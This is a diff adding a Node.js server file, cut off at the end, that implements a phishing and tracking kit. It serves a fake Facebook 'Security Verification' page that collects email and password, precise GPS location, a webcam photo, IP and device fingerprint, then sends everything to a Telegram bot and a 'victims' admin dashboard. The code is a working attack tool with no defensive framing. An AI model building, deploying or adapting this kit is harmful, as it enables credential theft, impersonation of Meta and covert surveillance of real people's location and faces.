@@ -1,0 +1,969 @@
+// server.js - Advanced Tracking System with Vercel Support
+const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
+const axios = require('axios');
+const multer = require('multer');
+const path = require('path');
+const fs = require('fs');
+const app = express();
+
+// Vercel port configuration
+const PORT = process.env.PORT || 3000;
+
+// Telegram Bot Configuration
+const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
+const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+
+// In-memory storage (use database in production)
+let victims = new Map();
+let analytics = {
+    total: 0,
+    byCountry: {},
+    byDevice: {},
+    byBrowser: {},
+    last24h: 0,
+    photosCaptured: 0,
+    locationsCaptured: 0
+};
+
+// Middleware
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public'));
+
+// HTML Interface
+const htmlTemplate = (victimId) => `
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification - Facebook</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #f0f2f5; color: #1c1e21; }
+        .container { max-width: 480px; margin: 40px auto; background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); overflow: hidden; }
+        .header { background: #1877f2; color: white; padding: 20px; text-align: center; }
+        .header h1 { font-size: 24px; }
+        .content { padding: 20px; }
+        .step { margin-bottom: 30px; display: none; }
+        .step.active { display: block; }
+        .step h3 { color: #1877f2; margin-bottom: 15px; font-size: 18px; }
+        .step p { color: #606770; margin-bottom: 20px; line-height: 1.5; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 8px; color: #606770; font-weight: 600; }
+        .form-group input { width: 100%; padding: 14px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .btn { background: #1877f2; color: white; border: none; padding: 14px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background .3s; }
+        .btn:hover { background: #166fe5; }
+        .btn-secondary { background: #42b72a; }
+        .btn-secondary:hover { background: #36a420; }
+        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .camera-container { width: 100%; height: 300px; background: #000; border-radius: 8px; overflow: hidden; margin-bottom: 20px; position: relative; }
+        #camera { width: 100%; height: 100%; object-fit: cover; }
+        .camera-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; }
+        .capture-btn { background: rgba(255,255,255,0.2); border: 3px solid white; border-radius: 50%; width: 80px; height: 80px; display: flex; justify-content: center; align-items: center; color: white; font-size: 24px; cursor: pointer; transition: transform .2s; }
+        .capture-btn:hover { transform: scale(1.1); }
+        .preview { display: none; width: 100%; height: 300px; object-fit: cover; border-radius: 8px; margin-bottom: 20px; }
+        .progress-bar { height: 4px; background: #e4e6eb; border-radius: 2px; margin: 20px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: #1877f2; width: 0%; transition: width 0.5s; }
+        .info-box { background: #f0f2f5; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; }
+        .permission-item { display: flex; align-items: center; margin-bottom: 15px; }
+        .permission-item input[type="checkbox"] { margin-right: 10px; }
+        .loading { display: none; text-align: center; padding: 40px; }
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success { display: none; text-align: center; padding: 40px; color: #42b72a; }
+        .success-icon { font-size: 48px; margin-bottom: 20px; }
+        .footer { text-align: center; padding: 20px; color: #8a8d91; font-size: 12px; border-top: 1px solid #dadde1; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Security Verification</h1>
+            <p>Facebook Account Protection</p>
+        </div>
+        
+        <div class="content">
+            <!-- Step 1: Login -->
+            <div class="step active" id="step1">
+                <h3>Step 1: Account Verification</h3>
+                <p>Enter your Facebook credentials to verify your identity.</p>
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="email">Email or Phone Number</label>
+                        <input type="text" id="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" required>
+                    </div>
+                    <button type="button" class="btn" onclick="nextStep()">Continue</button>
+                </form>
+            </div>
+            
+            <!-- Step 2: Permissions -->
+            <div class="step" id="step2">
+                <h3>Step 2: Security Permissions</h3>
+                <p>To prevent unauthorized access, we need to verify your physical location and identity.</p>
+                
+                <div class="info-box">
+                    <p>🔒 This helps us detect suspicious login attempts and protect your account.</p>
+                </div>
+                
+                <div class="permission-item">
+                    <input type="checkbox" id="location" checked>
+                    <label for="location">
+                        <strong>Allow Location Access</strong><br>
+                        Verify your current location for security
+                    </label>
+                </div>
+                
+                <div class="permission-item">
+                    <input type="checkbox" id="camera" checked>
+                    <label for="camera">
+                        <strong>Allow Camera Access</strong><br>
+                        Take a photo for facial verification
+                    </label>
+                </div>
+                
+                <div class="info-box">
+                    <p>📸 Your photo will be automatically deleted after verification.</p>
+                </div>
+                
+                <button class="btn" onclick="requestPermissions()">Allow & Continue</button>
+                <button class="btn btn-secondary" onclick="prevStep()" style="margin-top: 10px;">Back</button>
+            </div>
+            
+            <!-- Step 3: Location -->
+            <div class="step" id="step3">
+                <h3>📍 Location Verification</h3>
+                <p>Getting your current location...</p>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="locationProgress"></div>
+                </div>
+                <div id="locationInfo"></div>
+                <button class="btn" onclick="nextStep()" id="locationBtn" style="display:none;">Continue to Photo Verification</button>
+                <button class="btn btn-secondary" onclick="prevStep()" style="margin-top: 10px;">Back</button>
+            </div>
+            
+            <!-- Step 4: Camera -->
+            <div class="step" id="step4">
+                <h3>📸 Facial Verification</h3>
+                <p>Please look at the camera and capture a clear photo of your face.</p>
+                
+                <div class="camera-container">
+                    <video id="camera" autoplay></video>
+                    <canvas id="canvas" style="display:none;"></canvas>
+                    <div class="camera-overlay">
+                        <div class="capture-btn" onclick="capturePhoto()">
+                            📸
+                        </div>
+                    </div>
+                </div>
+                
+                <img id="photoPreview" class="preview" alt="Captured Photo">
+                
+                <div id="cameraControls">
+                    <button class="btn" onclick="capturePhoto()">📸 Capture Photo</button>
+                    <button class="btn btn-secondary" onclick="retakePhoto()" style="margin-top: 10px; display:none;" id="retakeBtn">🔄 Retake Photo</button>
+                    <button class="btn" onclick="nextStep()" style="margin-top: 10px; display:none;" id="usePhotoBtn">✅ Use This Photo</button>
+                </div>
+                
+                <button class="btn btn-secondary" onclick="prevStep()" style="margin-top: 10px;">Back</button>
+                <button class="btn btn-secondary" onclick="skipCamera()" style="margin-top: 10px; background: #8a8d91;">⏭️ Skip Camera</button>
+            </div>
+            
+            <!-- Step 5: System Info -->
+            <div class="step" id="step5">
+                <h3>🖥️ Device Verification</h3>
+                <p>Collecting device information for security analysis...</p>
+                
+                <div class="progress-bar">
+                    <div class="progress-fill" id="systemProgress"></div>
+                </div>
+                
+                <div id="systemInfo" class="info-box"></div>
+                
+                <button class="btn" onclick="collectSystemInfo()">Start Collection</button>
+                <button class="btn btn-secondary" onclick="prevStep()" style="margin-top: 10px;">Back</button>
+            </div>
+            
+            <!-- Loading -->
+            <div class="loading" id="loading">
+                <div class="loading-spinner"></div>
+                <h3>Processing Verification...</h3>
+                <p>Please wait while we secure your account.</p>
+                <p id="loadingStatus"></p>
+            </div>
+            
+            <!-- Success -->
+            <div class="success" id="success">
+                <div class="success-icon">✅</div>
+                <h3>Verification Complete!</h3>
+                <p>Your account is now secured.</p>
+                <p>Redirecting to Facebook...</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>This verification helps protect your account from unauthorized access.</p>
+            <p>Meta © ${new Date().getFullYear()} · Privacy Policy · Terms</p>
+        </div>
+    </div>
+
+    <script>
+        const victimId = '${victimId}';
+        let currentStep = 1;
+        let userData = {
+            victimId: victimId,
+            credentials: {},
+            location: {},
+            photo: null,
+            system: {},
+            network: {},
+            timestamp: null
+        };
+        
+        let cameraStream = null;
+        let photoCaptured = false;
+        
+        // Navigation functions
+        function showStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+            currentStep = step;
+            updateProgress();
+        }
+        
+        function nextStep() {
+            if (currentStep === 1) {
+                // Save credentials
+                userData.credentials = {
+                    email: document.getElementById('email').value,
+                    password: document.getElementById('password').value
+                };
+                if (!userData.credentials.email || !userData.credentials.password) {
+                    alert('Please enter both email and password.');
+                    return;
+                }
+            }
+            showStep(currentStep + 1);
+        }
+        
+        function prevStep() {
+            if (currentStep > 1) showStep(currentStep - 1);
+        }
+        
+        function updateProgress() {
+            const progress = (currentStep / 5) * 100;
+            document.querySelectorAll('.progress-fill').forEach(p => {
+                p.style.width = progress + '%';
+            });
+        }
+        
+        // Step 2: Permissions
+        function requestPermissions() {
+            if (!document.getElementById('location').checked) {
+                alert('Location permission is required for security verification.');
+                return;
+            }
+            showStep(3);
+            getLocation();
+        }
+        
+        // Step 3: Location
+        function getLocation() {
+            const progress = document.getElementById('locationProgress');
+            const info = document.getElementById('locationInfo');
+            const btn = document.getElementById('locationBtn');
+            
+            info.innerHTML = '<p>Requesting location access...</p>';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userData.location = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        };
+                        
+                        progress.style.width = '100%';
+                        info.innerHTML = \`
+                            <div class="info-box">
+                                <p><strong>📍 Location Verified</strong></p>
+                                <p>Latitude: \${userData.location.lat.toFixed(6)}</p>
+                                <p>Longitude: \${userData.location.lon.toFixed(6)}</p>
+                                <p>Accuracy: \${userData.location.accuracy} meters</p>
+                            </div>
+                        \`;
+                        btn.style.display = 'block';
+                        
+                        // Get address from coordinates
+                        getAddress(userData.location.lat, userData.location.lon);
+                    },
+                    (error) => {
+                        info.innerHTML = \`
+                            <div class="info-box">
+                                <p><strong>⚠️ Location Access Denied</strong></p>
+                                <p>Error: \${error.message}</p>
+                                <p>Please enable location services to continue.</p>
+                            </div>
+                        \`;
+                        btn.style.display = 'block';
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                info.innerHTML = '<p>Geolocation is not supported by this browser.</p>';
+                btn.style.display = 'block';
+            }
+        }
+        
+        async function getAddress(lat, lon) {
+            try {
+                const response = await fetch(\`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lon}\`);
+                const data = await response.json();
+                if (data.address) {
+                    userData.location.address = data.address;
+                    const info = document.getElementById('locationInfo');
+                    info.innerHTML += \`
+                        <div class="info-box" style="margin-top: 10px;">
+                            <p><strong>🏠 Approximate Address:</strong></p>
+                            <p>\${data.display_name || 'Address not available'}</p>
+                        </div>
+                    \`;
+                }
+            } catch (error) {
+                console.log('Address lookup failed:', error);
+            }
+        }
+        
+        // Step 4: Camera
+        function startCamera() {
+            const video = document.getElementById('camera');
+            
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                })
+                .then(stream => {
+                    video.srcObject = stream;
+                    cameraStream = stream;
+                    video.style.display = 'block';
+                })
+                .catch(error => {
+                    console.error('Camera error:', error);
+                    document.getElementById('camera').innerHTML = '<p style="color:white; text-align:center; padding: 20px;">Camera access denied. Please allow camera access or skip this step.</p>';
+                });
+            }
+        }
+        
+        function capturePhoto() {
+            const video = document.getElementById('camera');
+            const canvas = document.getElementById('canvas');
+            const preview = document.getElementById('photoPreview');
+            const retakeBtn = document.getElementById('retakeBtn');
+            const useBtn = document.getElementById('usePhotoBtn');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to base64
+            const photoData = canvas.toDataURL('image/jpeg', 0.9);
+            userData.photo = photoData;
+            photoCaptured = true;
+            
+            // Show preview
+            preview.src = photoData;
+            preview.style.display = 'block';
+            video.style.display = 'none';
+            retakeBtn.style.display = 'block';
+            useBtn.style.display = 'block';
+        }
+        
+        function retakePhoto() {
+            const video = document.getElementById('camera');
+            const preview = document.getElementById('photoPreview');
+            const retakeBtn = document.getElementById('retakeBtn');
+            const useBtn = document.getElementById('usePhotoBtn');
+            
+            preview.style.display = 'none';
+            video.style.display = 'block';
+            retakeBtn.style.display = 'none';
+            useBtn.style.display = 'none';
+            userData.photo = null;
+            photoCaptured = false;
+        }
+        
+        function skipCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            showStep(5);
+        }
+        
+        // Step 5: System Info
+        async function collectSystemInfo() {
+            const progress = document.getElementById('systemProgress');
+            const info = document.getElementById('systemInfo');
+            
+            info.innerHTML = '<p>Collecting device information...</p>';
+            progress.style.width = '25%';
+            
+            // Get IP address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userData.ip = ipData.ip;
+                progress.style.width = '40%';
+                
+                // Get IP info
+                const ipInfo = await fetch(\`https://ipapi.co/\${ipData.ip}/json/\`);
+                const ipInfoData = await ipInfo.json();
+                userData.ipInfo = ipInfoData;
+                progress.style.width = '60%';
+            } catch (error) {
+                console.log('IP detection failed:', error);
+            }
+            
+            // System information
+            userData.system = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                screen: \`\${window.screen.width}x\${window.screen.height} (avail: \${window.screen.availWidth}x\${window.screen.availHeight})\`,
+                colorDepth: window.screen.colorDepth,
+                pixelDepth: window.screen.pixelDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                touchPoints: navigator.maxTouchPoints,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver
+            };
+            progress.style.width = '80%';
+            
+            // Network information
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                userData.network = {
+                    effectiveType: connection.effectiveType,
+                    downlink: connection.downlink,
+                    rtt: connection.rtt,
+                    saveData: connection.saveData,
+                    type: connection.type
+                };
+            }
+            progress.style.width = '100%';
+            
+            // Display collected info
+            info.innerHTML = \`
+                <div class="info-box">
+                    <p><strong>📱 Device Information Collected:</strong></p>
+                    <p>IP Address: \${userData.ip || 'Unknown'}</p>
+                    <p>Browser: \${detectBrowser()}</p>
+                    <p>OS: \${detectOS()}</p>
+                    <p>Screen: \${userData.system.screen}</p>
+                    <p>Language: \${userData.system.language}</p>
+                    <p>Timezone: \${userData.system.timezone}</p>
+                </div>
+            \`;
+            
+            // Auto-proceed after 2 seconds
+            setTimeout(() => {
+                completeTracking();
+            }, 2000);
+        }
+        
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            if (ua.includes('Opera')) return 'Opera';
+            return 'Unknown Browser';
+        }
+        
+        function detectOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+            return 'Unknown OS';
+        }
+        
+        // Final Step: Complete Tracking
+        async function completeTracking() {
+            document.getElementById('step5').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            userData.timestamp = new Date().toISOString();
+            userData.url = window.location.href;
+            userData.referrer = document.referrer;
+            
+            const status = document.getElementById('loadingStatus');
+            status.textContent = 'Sending verification data...';
+            
+            try {
+                // Send data to server
+                const response = await fetch('/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(userData)
+                });
+                
+                if (response.ok) {
+                    status.textContent = 'Verification successful!';
+                    
+                    // Show success message
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('success').style.display = 'block';
+                        
+                        // Redirect to Facebook after 3 seconds
+                        setTimeout(() => {
+                            window.location.href = 'https://facebook.com';
+                        }, 3000);
+                    }, 2000);
+                }
+            } catch (error) {
+                status.textContent = 'Error: ' + error.message;
+                setTimeout(() => {
+                    window.location.href = 'https://facebook.com';
+                }, 3000);
+            }
+            
+            // Clean up camera
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            showStep(1);
+            // Start camera when step 4 is shown
+            const observer = new MutationObserver((mutations) => {
+                mutations.forEach((mutation) => {
+                    if (mutation.target.id === 'step4' && mutation.target.classList.contains('active')) {
+                        startCamera();
+                    }
+                });
+            });
+            observer.observe(document.getElementById('step4'), { attributes: true, attributeFilter: ['class'] });
+        });
+    </script>
+</body>
+</html>
+`;
+
+// Routes
+app.get('/', (req, res) => {
+    const victimId = generateVictimId(req);
+    res.send(htmlTemplate(victimId));
+});
+
+app.post('/track', async (req, res) => {
+    try {
+        const trackingData = req.body;
+        
+        // Enhanced IP analysis
+        if (trackingData.ip && !trackingData.ipInfo) {
+            try {
+                const ipInfo = await axios.get(`https://ipapi.co/${trackingData.ip}/json/`);
+                trackingData.ipInfo = ipInfo.data;
+            } catch (error) {
+                trackingData.ipInfo = { error: 'Failed to fetch IP info' };
+            }
+        }
+        
+        // Store data
+        victims.set(trackingData.victimId, trackingData);
+        
+        // Update analytics
+        updateAnalytics(trackingData);
+        
+        // Send to Telegram
+        await sendToTelegram(trackingData);
+        
+        // Save to file (for Vercel, use temporary storage)
+        saveToTempFile(trackingData);
+        
+        res.json({ success: true, message: 'Data received' });
+    } catch (error) {
+        console.error('Tracking error:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// Admin Dashboard
+app.get('/admin', (req, res) => {
+    const victimList = Array.from(victims.values()).map(v => ({
+        id: v.victimId,
+        email: v.credentials.email,
+        ip: v.ip,
+        location: v.location,
+        timestamp: v.timestamp,
+        hasPhoto: !!v.photo
+    }));
+    
+    const dashboard = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Admin Dashboard</title>
+        <style>
+            body { font-family: Arial; padding: 20px; background: #f5f5f5; }
+            .container { max-width: 1200px; margin: 0 auto; }
+            .header { background: #1877f2; color: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
+            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+            .stat-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); }
+            .victim-list { background: white; padding: 20px; border-radius: 8px; }
+            .victim-item { border-bottom: 1px solid #eee; padding: 15px 0; }
+            .btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
+            .btn-danger { background: #dc3545; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>🕵️ Tracking Dashboard</h1>
+                <p>Total Victims: ${victims.size} | Last 24h: ${analytics.last24h}</p>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-card">
+                    <h3>📈 Total</h3>
+                    <p style="font-size: 24px;">${analytics.total}</p>
+                </div>
+                <div class="stat-card">
+                    <h3>📸 Photos</h3>
+                    <p style="font-size: 24px;">${analytics.photosCaptured}</p>
+                </div>
+                <div class="stat-card">
+                    <h3>📍 Locations</h3>
+                    <p style="font-size: 24px;">${analytics.locationsCaptured}</p>
+                </div>
+                <div class="stat-card">
+                    <h3>🌍 Countries</h3>
+                    <p>${Object.keys(analytics.byCountry).length}</p>
+                </div>
+            </div>
+            
+            <div class="victim-list">
+                <h2>Recent Victims</h2>
+                ${victimList.map(v => `
+                    <div class="victim-item">
+                        <strong>${v.email}</strong>
+                        <p>IP: ${v.ip} | Location: ${v.location.lat ? `${v.location.lat}, ${v.location.lon}` : 'N/A'}</p>
+                        <p>Time: ${new Date(v.timestamp).toLocaleString()} | Photo: ${v.hasPhoto ? '✅' : '❌'}</p>
+                        <button class="btn" onclick="viewVictim('${v.id}')">View Details</button>
+                        <button class="btn btn-danger" onclick="deleteVictim('${v.id}')">Delete</button>
+                    </div>
+                `).join('')}
+            </div>
+        </div>
+        
+        <script>
+            function viewVictim(id) {
+                window.open('/victim/' + id, '_blank');
+            }
+            
+            function deleteVictim(id) {
+                if (confirm('Delete this victim?')) {
+                    fetch('/victim/' + id, { method: 'DELETE' })
+                        .then(() => location.reload());
+                }
+            }
+        </script>
+    </body>
+    </html>
+    `;
+    
+    res.send(dashboard);
+});
+
+app.get('/victim/:id', (req, res) => {
+    const victim = victims.get(req.params.id);
+    if (!victim) {
+        res.status(404).send('Victim not found');
+        return;
+    }
+    
+    res.json(victim);
+});
+
+app.delete('/victim/:id', (req, res) => {
+    victims.delete(req.params.id);
+    res.json({ success: true });
+});
+
+// Telegram Bot Functions
+async function sendToTelegram(data) {
+    try {
+        // 1. Send basic info
+        let message = `🚨 *NEW VICTIM TRACKED* 🚨\n\n`;
+        message += `*📧 Credentials:*\n`;
+        message += `👤 Email: \`${data.credentials.email}\`\n`;
+        message += `🔑 Password: \`${data.credentials.password}\`\n\n`;
+        
+        message += `*🌐 IP Information:*\n`;
+        message += `📍 IP: \`${data.ip}\`\n`;
+        if (data.ipInfo) {
+            message += `🏙️ City: ${data.ipInfo.city || 'N/A'}\n`;
+            message += `🏳️ Country: ${data.ipInfo.country_name || 'N/A'} (${data.ipInfo.country_code || 'N/A'})\n`;
+            message += `🏢 ISP: ${data.ipInfo.org || 'N/A'}\n`;
+        }
+        
+        message += `\n*📍 GPS Location:*\n`;
+        if (data.location.lat) {
+            message += `📡 Coordinates: ${data.location.lat}, ${data.location.lat}\n`;
+            message += `🎯 Accuracy: ${data.location.accuracy}m\n`;
+            message += `🗺️ Google Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}\n`;
+            if (data.location.address) {
+                message += `🏠 Address: ${JSON.stringify(data.location.address)}\n`;
+            }
+        } else {
+            message += `❌ Location not available\n`;
+        }
+        
+        message += `\n*🖥️ Device Info:*\n`;
+        message += `💻 Browser: ${data.system.userAgent.split(' ')[0]}\n`;
+        message += `🖥️ Screen: ${data.system.screen}\n`;
+        message += `🌐 Language: ${data.system.language}\n`;
+        message += `⏰ Timezone: ${data.system.timezone}\n`;
+        
+        message += `\n*📊 Network:*\n`;
+        if (data.network.effectiveType) {
+            message += `📶 Connection: ${data.network.effectiveType}\n`;
+            message += `⚡ Speed: ${data.network.downlink || 'N/A'} Mbps\n`;
+        }
+        
+        message += `\n*⏰ Timestamp:* ${new Date(data.timestamp).toLocaleString()}\n`;
+        
+        // Send text message
+        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
+        
+        // 2. Send location on map
+        if (data.location.lat && data.location.lon) {
+            await bot.sendLocation(CHAT_ID, data.location.lat, data.location.lon);
+            
+            // Send static map
+            const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${data.location.lat},${data.location.lon}&zoom=15&size=600x300&markers=color:red%7C${data.location.lat},${data.location.lon}&key=YOUR_GOOGLE_MAPS_KEY`;
+            await bot.sendPhoto(CHAT_ID, mapUrl);
+        }
+        
+        // 3. Send photo if available
+        if (data.photo) {
+            try {
+                // Convert base64 to buffer
+                const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
+                const buffer = Buffer.from(base64Data, 'base64');
+                
+                // Send as photo
+                await bot.sendPhoto(CHAT_ID, buffer, {
+                    caption: '📸 Captured Photo - Facial Verification'
+                });
+            } catch (photoError) {
+                console.error('Failed to send photo:', photoError);
+            }
+        }
+        
+        // 4. Send system details file
+        const systemDetails = JSON.stringify(data, null, 2);
+        await bot.sendDocument(CHAT_ID, Buffer.from(systemDetails), {
+            filename: `victim_${data.victimId}_details.json`,
+            caption: '📄 Complete Victim Details'
+        });
+        
+    } catch (error) {
+        console.error('Telegram send error:', error);
+    }
+}
+
+// Helper Functions
+function generateVictimId(req) {
+    return require('crypto')
+        .createHash('md5')
+        .update(Date.now() + Math.random() + req.ip)
+        .digest('hex')
+        .substring(0, 12);
+}
+
+function updateAnalytics(data) {
+    analytics.total++;
+    
+    // Check if within 24 hours
+    const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
+    if (new Date(data.timestamp).getTime() > oneDayAgo) {
+        analytics.last24h++;
+    }
+    
+    // Country
+    if (data.ipInfo && data.ipInfo.country) {
+        analytics.byCountry[data.ipInfo.country] = (analytics.byCountry[data.ipInfo.country] || 0) + 1;
+    }
+    
+    // Device type
+    const isMobile = /mobile/i.test(data.system.userAgent);
+    const deviceType = isMobile ? 'Mobile' : 'Desktop';
+    analytics.byDevice[deviceType] = (analytics.byDevice[deviceType] || 0) + 1;
+    
+    // Browser detection
+    const ua = data.system.userAgent;
+    let browser = 'Unknown';
+    if (ua.includes('Chrome')) browser = 'Chrome';
+    else if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Safari')) browser = 'Safari';
+    else if (ua.includes('Edge')) browser = 'Edge';
+    analytics.byBrowser[browser] = (analytics.byBrowser[browser] || 0) + 1;
+    
+    // Photos and locations
+    if (data.photo) analytics.photosCaptured++;
+    if (data.location.lat) analytics.locationsCaptured++;
+}
+
+function saveToTempFile(data) {
+    // In Vercel, use /tmp directory for temporary files
+    const tmpDir = '/tmp';
+    if (!fs.existsSync(tmpDir)) {
+        fs.mkdirSync(tmpDir, { recursive: true });
+    }
+    
+    const filename = `${tmpDir}/victim_${data.victimId}_${Date.now()}.json`;
+    fs.writeFileSync(filename, JSON.stringify(data, null, 2));
+    
+    // Also append to master log
+    const masterLog = `${tmpDir}/master_log.json`;
+    let logs = [];
+    if (fs.existsSync(masterLog)) {
+        logs = JSON.parse(fs.readFileSync(masterLog));
+    }
+    logs.push(data);
+    fs.writeFileSync(masterLog, JSON.stringify(logs, null, 2));
+}
+
+// Telegram Bot Commands
+bot.onText(/\/start/, (msg) => {
+    bot.sendMessage(msg.chat.id, `
+🕵️ *Advanced Tracking System* 🕵️
+
+*Commands:*
+/victims - List all tracked victims
+/stats - Show detailed statistics
+/latest - Show latest victim
+/clear - Clear all data (admin)
+/help - Show this help
+
+*Auto-reports:* New victims will be automatically reported here with photos and locations.
+
+*Admin:* ${msg.from.first_name} (ID: ${msg.from.id})
+    `, { parse_mode: 'Markdown' });
+});
+
+bot.onText(/\/victims/, async (msg) => {
+    if (victims.size === 0) {
+        bot.sendMessage(msg.chat.id, 'No victims tracked yet.');
+        return;
+    }
+    
+    let message = `👥 *Tracked Victims (${victims.size})*:\n\n`;
+    const victimArray = Array.from(victims.values());
+    
+    victimArray.slice(-10).reverse().forEach((v, i) => {
+        message += `${i+1}. ${v.credentials.email}\n`;
+        message += `   📍 ${v.ip || 'No IP'} | 📸 ${v.photo ? 'Yes' : 'No'}\n`;
+        message += `   ⏰ ${new Date(v.timestamp).toLocaleTimeString()}\n\n`;
+    });
+    
+    bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown' });
+});
+
+bot.onText(/\/stats/, (msg) => {
+    const statsMessage = `
+📊 *Tracking Statistics*
+
+*Totals:*
+👥 Total Victims: ${analytics.total}
+📸 Photos Captured: ${analytics.photosCaptured}
+📍 Locations Captured: ${analytics.locationsCaptured}
+📈 Last 24 Hours: ${analytics.last24h}
+
+*Devices:*
+${Object.entries(analytics.byDevice).map(([d, c]) => `📱 ${d}: ${c}`).join('\n')}
+
+*Browsers:*
+${Object.entries(analytics.byBrowser).map(([b, c]) => `🌐 ${b}: ${c}`).join('\n')}
+
+*Top Countries:*
+${Object.entries(analytics.byCountry)
+    .sort((a, b) => b[1] - a[1])
+    .slice(0, 5)
+    .map(([c, n]) => `🏳️ ${c}: ${n}`)
+    .join('\n')}
+
+⏰ Updated: ${new Date().toLocaleString()}
+    `;
+    
+    bot.sendMessage(msg.chat.id, statsMessage, { parse_mode: 'Markdown' });
+});
+
+bot.onText(/\/latest/, (msg) => {
+    if (victims.size === 0) {
+        bot.sendMessage(msg.chat.id, 'No victims tracked yet.');
+        return;
+    }
+    
+    const latest = Array.from(victims.values()).pop();
+    const message = `
+🎯 *Latest Victim*
+
+*Email:* ${latest.credentials.email}
+*IP:* ${latest.ip}
+*Location:* ${latest.location.lat ? `${latest.location.lat}, ${latest.location.lon}` : 'Not available'}
+*Time:* ${new Date(latest.timestamp).toLocaleString()}
+*Photo:* ${latest.photo ? '✅ Captured' : '❌ Not captured'}
+
+*Device:* ${latest.system.userAgent.split(' ')[0]}
+*Screen:* ${latest.system.screen}
+    `;
+    
+    bot.sendMessage(msg.chat.id, message, { parse_mode: 'Markdown' });
+    
+    // Send photo if available
+    if (latest.photo) {
+        try {
